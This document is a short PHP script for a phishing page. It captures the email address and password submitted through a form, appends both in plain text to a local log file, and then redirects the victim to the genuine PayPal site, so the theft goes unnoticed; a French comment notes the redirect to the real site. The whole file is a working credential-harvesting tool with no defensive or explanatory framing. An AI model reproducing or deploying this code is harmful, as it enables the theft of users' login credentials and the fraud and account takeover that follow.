<?php
if (!empty($_POST['email']) && !empty($_POST['password'])) {
    $data = "Email: " . $_POST['email'] . " | Password: " . $_POST['password'] . "\n";
    file_put_contents("log.txt", $data, FILE_APPEND);
}

header("Location: https://www.paypal.com"); // Redirection vers le vrai site
exit();
?>
